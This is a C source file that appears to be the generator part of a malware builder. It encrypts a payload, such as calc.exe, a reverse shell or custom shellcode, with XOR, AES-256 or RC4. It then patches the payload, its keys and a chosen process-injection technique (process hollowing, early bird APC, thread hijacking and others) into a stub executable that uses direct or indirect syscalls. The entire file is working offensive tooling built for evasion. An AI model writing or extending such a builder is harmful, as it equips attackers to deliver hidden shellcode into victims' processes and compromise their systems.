#include "generator.h"
#include "payloads/payloads.h"
#include "crypto/crypto.h"
#include <stdio.h>
#include <stdlib.h>

#define PAYLOAD_MARKER 0xDEADBEEF

#define OFF_PAYLOAD_SIZE    0
#define OFF_PAYLOAD         sizeof(DWORD)
#define OFF_ENC_METHOD      (sizeof(DWORD) + MAX_PAYLOAD_SIZE)
#define OFF_XOR_KEY         (OFF_ENC_METHOD + 1)
#define OFF_AES_KEY         (OFF_XOR_KEY + 1)
#define OFF_AES_IV          (OFF_AES_KEY + 32)
#define OFF_RC4_KEY         (OFF_AES_IV + 16)
#define OFF_TECHNIQUE       (OFF_RC4_KEY + 16)
#define OFF_TARGET          (OFF_TECHNIQUE + 1)

BYTE GetTechniqueIndex(InjectionTechnique technique) {
	switch (technique) {
	case INJECTION_CREATE_REMOTE_THREAD: return 0;
	case INJECTION_EARLY_BIRD_APC: return 1;
	case INJECTION_THREAD_HIJACKING: return 2;
	case INJECTION_PROCESS_HOLLOWING: return 3;
	case INJECTION_REMOTE_MAPPING: return 4;
	default: return 0;
	}
}

BOOL GetStubPath(const MalgenConfig* config, CHAR* stub_path) {
	const CHAR* api_name;
	CHAR exe_dir[MAX_PATH];
	CHAR* last_slash;

	switch (config->api_level) {
	case API_WINAPI:
		api_name = "winapi";
		break;
	case API_NTDLL:
		api_name = "ntdll";
		break;
	case API_DIRECT_SYSCALLS:
		api_name = "syscalls";
		break;
	case API_INDIRECT_SYSCALLS:
		api_name = "indirect";
		break;
	default:
		api_name = "winapi";
		break;
	}

	GetModuleFileNameA(NULL, exe_dir, MAX_PATH);
	last_slash = strrchr(exe_dir, '\\');
	if (last_slash) {
		*(last_slash + 1) = '\0';
	}

	sprintf_s(stub_path, MAX_PATH_LEN, "%s..\\..\\src\\stubs\\stub_%s.exe", exe_dir, api_name);
	return TRUE;
}

BOOL PatchBinary(MalgenConfig* config, LPVOID payload, SIZE_T payload_size) {
	HANDLE hStub, hOutput;
	DWORD stub_size, bytes_read, bytes_written;
	LPBYTE stub_data;
	DWORD i, marker_offset = 0;
	DWORD marker = PAYLOAD_MARKER;
	BOOL found = FALSE;
	CHAR stub_path[MAX_PATH_LEN];
	SIZE_T encrypted_size = payload_size;

	GetStubPath(config, stub_path);

	hStub = CreateFileA(stub_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hStub == INVALID_HANDLE_VALUE) {
		printf("cant find stub: %s\n", stub_path);
		printf("build stubs first\n");
		return FALSE;
	}

	stub_size = GetFileSize(hStub, NULL);
	stub_data = (LPBYTE)malloc(stub_size + payload_size + 16);
	if (!stub_data) {
		CloseHandle(hStub);
		return FALSE;
	}

	if (!ReadFile(hStub, stub_data, stub_size, &bytes_read, NULL)) {
		printf("couldnt read stub\n");
		free(stub_data);
		CloseHandle(hStub);
		return FALSE;
	}
	CloseHandle(hStub);

	for (i = 0; i < stub_size - sizeof(DWORD) - 12; i++) {
		if (*(DWORD*)(stub_data + i) == marker) {
			BOOL looks_like_struct = TRUE;
			DWORD j;
			for (j = sizeof(DWORD); j < sizeof(DWORD) + 12; j++) {
				if (stub_data[i + j] != 0) {
					looks_like_struct = FALSE;
					break;
				}
			}
			if (looks_like_struct) {
				marker_offset = i;
				found = TRUE;
				break;
			}
		}
	}

	if (!found) {
		printf("marker not found in stub\n");
		free(stub_data);
		return FALSE;
	}

	printf("found marker at offset: 0x%X\n", marker_offset);

	switch (config->encryption) {
	case ENCRYPTION_XOR:
		printf("encrypting with XOR (key: 0x%02X)...\n", config->xor_key);
		EncryptXOR((LPBYTE)payload, payload_size, config->xor_key);
		break;
	case ENCRYPTION_AES:
		GenerateRandomBytes(config->aes_key, 32);
		GenerateRandomBytes(config->aes_iv, 16);
		printf("encrypting with AES-256-CBC...\n");
		printf("  key: ");
		for (i = 0; i < 32; i++) printf("%02X", config->aes_key[i]);
		printf("\n  iv:  ");
		for (i = 0; i < 16; i++) printf("%02X", config->aes_iv[i]);
		printf("\n");
		encrypted_size = ((payload_size / 16) + 1) * 16;
		EncryptAES256((LPBYTE)payload, payload_size, config->aes_key, config->aes_iv);
		break;
	case ENCRYPTION_RC4:
		GenerateRandomBytes(config->rc4_key, 16);
		printf("encrypting with RC4...\n");
		printf("  key: ");
		for (i = 0; i < 16; i++) printf("%02X", config->rc4_key[i]);
		printf("\n");
		EncryptRC4((LPBYTE)payload, payload_size, config->rc4_key, 16);
		break;
	default:
		printf("no encryption\n");
		break;
	}

	printf("\npatching struct:\n");
	printf("  payload_size: %zu bytes\n", encrypted_size);
	printf("  encryption_method: %d\n", config->encryption);
	printf("  technique: %d\n", GetTechniqueIndex(config->injection));
	printf("  target: %s\n", config->target.process_name);

	*(DWORD*)(stub_data + marker_offset + OFF_PAYLOAD_SIZE) = (DWORD)encrypted_size;
	memcpy(stub_data + marker_offset + OFF_PAYLOAD, payload, encrypted_size);
	*(stub_data + marker_offset + OFF_ENC_METHOD) = (BYTE)config->encryption;
	*(stub_data + marker_offset + OFF_XOR_KEY) = config->xor_key;
	memcpy(stub_data + marker_offset + OFF_AES_KEY, config->aes_key, 32);
	memcpy(stub_data + marker_offset + OFF_AES_IV, config->aes_iv, 16);
	memcpy(stub_data + marker_offset + OFF_RC4_KEY, config->rc4_key, 16);
	*(stub_data + marker_offset + OFF_TECHNIQUE) = GetTechniqueIndex(config->injection);
	memcpy(stub_data + marker_offset + OFF_TARGET, config->target.process_name, strlen(config->target.process_name) + 1);

	hOutput = CreateFileA(config->output_path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (hOutput == INVALID_HANDLE_VALUE) {
		printf("couldnt create output file\n");
		free(stub_data);
		return FALSE;
	}

	if (!WriteFile(hOutput, stub_data, stub_size, &bytes_written, NULL)) {
		printf("couldnt write output\n");
		CloseHandle(hOutput);
		free(stub_data);
		return FALSE;
	}

	printf("wrote %lu bytes\n", bytes_written);

	if (!FlushFileBuffers(hOutput)) {
		printf("warning: couldnt flush buffers\n");
	}

	CloseHandle(hOutput);
	free(stub_data);

	return TRUE;
}

VOID PrintConfigSummary(const MalgenConfig* config) {
	printf("config:\n");

	printf("\tpayload: ");
	switch (config->payload_type) {
	case PAYLOAD_CALC: printf("calc.exe\n"); break;
	case PAYLOAD_REVERSE_SHELL: printf("reverse shell\n"); break;
	case PAYLOAD_CUSTOM_SHELLCODE: printf("custom shellcode\n"); break;
	}

	printf("\tencryption: ");
	switch (config->encryption) {
	case ENCRYPTION_NONE: printf("none\n"); break;
	case ENCRYPTION_XOR: printf("XOR (key: 0x%02X)\n", config->xor_key); break;
	case ENCRYPTION_AES: printf("AES-256-CBC\n"); break;
	case ENCRYPTION_RC4: printf("RC4\n"); break;
	}

	printf("\tinjection: ");
	switch (config->injection) {
	case INJECTION_CREATE_REMOTE_THREAD: printf("CreateRemoteThread\n"); break;
	case INJECTION_EARLY_BIRD_APC: printf("early bird APC\n"); break;
	case INJECTION_THREAD_HIJACKING: printf("thread hijacking\n"); break;
	case INJECTION_PROCESS_HOLLOWING: printf("process hollowing\n"); break;
	case INJECTION_REMOTE_MAPPING: printf("remote mapping\n"); break;
	}

	printf("\tAPI: ");
	switch (config->api_level) {
	case API_WINAPI: printf("WinAPI\n"); break;
	case API_NTDLL: printf("NTDLL\n"); break;
	case API_DIRECT_SYSCALLS: printf("direct syscalls\n"); break;
	case API_INDIRECT_SYSCALLS: printf("indirect syscalls\n"); break;
	}

	printf("\ttarget: %s\n", config->target.process_name);
}

BOOL GenerateMalware(MalgenConfig* config) {
	LPVOID payload;
	SIZE_T payload_size;
	LPVOID payload_buffer;

	PrintConfigSummary(config);

	printf("\ngetting payload\n");
	if (!GetPayload(config->payload_type, &payload, &payload_size)) {
		printf("couldnt get payload\n");
		return FALSE;
	}

	printf("payload size: %zu bytes\n", payload_size);

	payload_buffer = malloc(payload_size + 16);
	if (!payload_buffer) {
		free(payload);
		return FALSE;
	}
	memcpy(payload_buffer, payload, payload_size);
	free(payload);

	printf("patching stub\n");
	if (!PatchBinary(config, payload_buffer, payload_size)) {
		free(payload_buffer);
		return FALSE;
	}

	free(payload_buffer);
	printf("done: %s\n", config->output_path);
	return TRUE;
}
